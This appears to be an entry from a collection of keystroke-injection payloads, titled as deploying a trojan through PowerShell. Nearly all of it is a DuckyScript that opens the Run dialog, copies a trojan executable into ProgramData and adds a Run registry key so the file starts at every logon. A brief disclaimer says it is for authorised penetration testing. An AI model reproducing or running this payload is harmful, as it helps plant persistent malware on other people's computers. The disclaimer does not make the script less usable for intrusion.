# Deploying a Trojan via PowerShell Script

Deploys a trojan executable and ensures it runs persistently by adding it to the registry.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "Copy-Item 'C:\\path\\to\\trojan.exe' -Destination 'C:\\ProgramData\\trojan.exe'; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Trojan' -Value 'C:\\ProgramData\\trojan.exe' -PropertyType String -Force"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.